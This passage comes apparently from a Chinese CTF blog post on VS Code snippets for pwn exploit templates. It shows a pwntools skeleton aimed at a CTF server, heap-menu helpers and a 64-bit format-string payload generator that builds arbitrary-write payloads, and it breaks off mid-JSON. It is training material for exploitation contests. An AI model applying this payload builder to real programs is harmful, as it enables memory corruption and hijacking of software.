class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29886</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./SWPUCTF_2019_login&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn exp模板 + vscode snippet</title>
      <link href="2021/07/19/Snippet/"/>
      <url>2021/07/19/Snippet/</url>
      
        <content type="html"><![CDATA[<p>  snippet，或者说「code snippet」，也即代码片，指的是能够帮助输入重复代码模式，比如循环或条件语句，的模板。通过 snippet ，我们仅仅输入一小段字符串，就可以在代码片引擎的帮助下，生成预定义的模板代码，接着我们还可以通过在预定义的光标位置之间跳转，来快速补全模板。</p><p>vscode 集成了这种功能，ctrl + shift + p，就可以调出“配置用户代码片段”的功能</p><p>因为pwn模板很多都相似，比如都会加载binary文件，在heap菜单中都有add等诸如此类的功能，每次写都会很麻烦，我之前配置过snippet，但是想要一个半自动化的方法来配置，写了一个小脚本来完成这个功能</p><ul><li>github地址:<a href="https://github.com/LA13x/vscode-snippet-pwn-template">https://github.com/LA13x/vscode-snippet-pwn-template</a></li></ul><h2 id="pwn-exp框架"><a href="#pwn-exp框架" class="headerlink" title="pwn exp框架"></a>pwn exp框架</h2><p>此框架采用了师傅们的模板，具体链接放到Reference中<br>我写了三个snippet，分别是总体上的pwn框架，menu框架（heap中的）还有64位格式化字符串框架，分别如下</p><h3 id="pwn-py"><a href="#pwn-py" class="headerlink" title="pwn.py"></a>pwn.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;$1&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;$2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25965</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set $base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="menu-py"><a href="#menu-py" class="headerlink" title="menu.py"></a>menu.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_add,_free,_edit,_show = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;$1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_show))</span><br><span class="line">    sla(<span class="string">&quot;&quot;</span>, <span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure><h3 id="format-py"><a href="#format-py" class="headerlink" title="format.py"></a>format.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_string_template_64</span>(<span class="params">location_arg,target,after_change,len_other_string = <span class="number">0</span>,ljust_location = <span class="number">0x50</span>,bit = <span class="number">0x6</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    第一个参数是格式化字符串的位置，即第几个参数</span></span><br><span class="line"><span class="string">    第二个参数是要改哪里的值</span></span><br><span class="line"><span class="string">    第三个参数是把想把目标值改成什么值</span></span><br><span class="line"><span class="string">    第四个参数是看看在printf之前还有没有奇奇怪怪的字符串</span></span><br><span class="line"><span class="string">    第五个参数是ljust填补核心payload之后，让其0x8个字节对齐，默认是0x50</span></span><br><span class="line"><span class="string">    第六个参数是要覆盖的位数，默认为6</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> bit == <span class="number">1</span>:</span><br><span class="line">        low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">        c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">        location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">        payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        payload = payload + p64(target)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bit == <span class="number">2</span>:</span><br><span class="line">        low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">        low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">        c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">        location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">        location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        payload = payload + p64(target)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bit == <span class="number">3</span>:</span><br><span class="line">        low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">        low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">        low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">    </span><br><span class="line">        c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">    </span><br><span class="line">        location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">        location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">        location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        payload = payload + p64(target)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bit == <span class="number">4</span>:</span><br><span class="line">        low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">        low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">        low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">        low4 = (after_change &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">    </span><br><span class="line">        c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c4 = (low4 - low3 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">    </span><br><span class="line">        location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">        location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">        location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">        location_arg4 = location_arg3 + <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c4) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg4) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        payload = payload + p64(target)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bit == <span class="number">5</span>:</span><br><span class="line">        low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">        low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">        low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">        low4 = (after_change &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">        low5 = (after_change &amp; <span class="number">0xff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">    </span><br><span class="line">        c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c4 = (low4 - low3 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c5 = (low5 - low4 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">    </span><br><span class="line">        location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">        location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">        location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">        location_arg4 = location_arg3 + <span class="number">1</span></span><br><span class="line">        location_arg5 = location_arg4 + <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c4) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg4) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c5) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg5) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        payload = payload + p64(target)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x3</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bit == <span class="number">6</span>:</span><br><span class="line">        low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">        low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">        low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">        low4 = (after_change &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">        low5 = (after_change &amp; <span class="number">0xff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">        low6 = (after_change &amp; <span class="number">0xff0000000000</span>) &gt;&gt; <span class="number">40</span></span><br><span class="line">    </span><br><span class="line">        c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c4 = (low4 - low3 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c5 = (low5 - low4 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c6 = (low6 - low5 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">    </span><br><span class="line">        location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">        location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">        location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">        location_arg4 = location_arg3 + <span class="number">1</span></span><br><span class="line">        location_arg5 = location_arg4 + <span class="number">1</span></span><br><span class="line">        location_arg6 = location_arg5 + <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c4) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg4) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c5) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg5) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c6) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg6) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        payload = payload + p64(target)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x3</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x4</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><h2 id="将上述模板写入snippet"><a href="#将上述模板写入snippet" class="headerlink" title="将上述模板写入snippet"></a>将上述模板写入snippet</h2><p>采取了json库和文件操作来实现，整个settings.json来配置路径和prefix、body等信息<br>参照code的snippet说明和格式要求来完成<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span>():</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    content = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;settings.json&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        jsdata = json.load(f)</span><br><span class="line"></span><br><span class="line">    jsonPath = jsdata[<span class="string">&quot;jsonPath&quot;</span>]</span><br><span class="line">    files = jsdata[<span class="string">&quot;filePath&quot;</span>]</span><br><span class="line">    names =  jsdata[<span class="string">&quot;snippetName&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(files)):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(files[i], <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read().splitlines()</span><br><span class="line">        data[names[i]] = &#123;</span><br><span class="line">            <span class="string">&quot;prefix&quot;</span>: names[i], </span><br><span class="line">            <span class="string">&quot;body&quot;</span>: content</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(jsonPath, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        json.dump(data, f, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;OK!&quot;</span>)</span><br></pre></td></tr></table></figure></p><h3 id="Python-snippet"><a href="#Python-snippet" class="headerlink" title="Python.snippet"></a>Python.snippet</h3><p>运行python文件，得到的Python的snippet文件如下<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;pwn&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;prefix&quot;</span>: <span class="string">&quot;pwn&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;body&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;from pwn import *&quot;</span>,</span><br><span class="line">            <span class="string">&quot;import sys&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;arch =  64&quot;</span>,</span><br><span class="line">            <span class="string">&quot;challenge = \&quot;$1\&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;libc_path = &#x27;$2&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def dbg():&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    context.log_level = &#x27;debug&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def echo(content):&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    print(\&quot;\\033[4;36;40mOutput prompts:\\033[0m\&quot; + \&quot;\\t\\033[7;33;40m[*]\\033[0m 